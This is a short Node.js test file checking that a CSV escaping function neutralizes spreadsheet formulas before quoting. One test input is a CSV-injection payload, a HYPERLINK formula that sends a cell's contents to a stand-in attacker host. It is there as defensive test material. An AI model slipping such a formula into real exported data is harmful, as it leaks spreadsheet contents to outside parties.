import assert from "node:assert/strict"
import test from "node:test"

import { escapeCsvCell } from "./csv.ts"

test("CSV cells neutralize formulas before applying CSV quoting", () => {
  assert.equal(
    escapeCsvCell('=HYPERLINK("https://evil.example/?="&A1,"x")'),
    '"\'=HYPERLINK(""https://evil.example/?=""&A1,""x"")"',
  )
  assert.equal(escapeCsvCell("+1+1"), "'+1+1")
  assert.equal(escapeCsvCell("@SUM(A1:A2)"), "'@SUM(A1:A2)")
  assert.equal(escapeCsvCell("safe,value"), '"safe,value"')
})
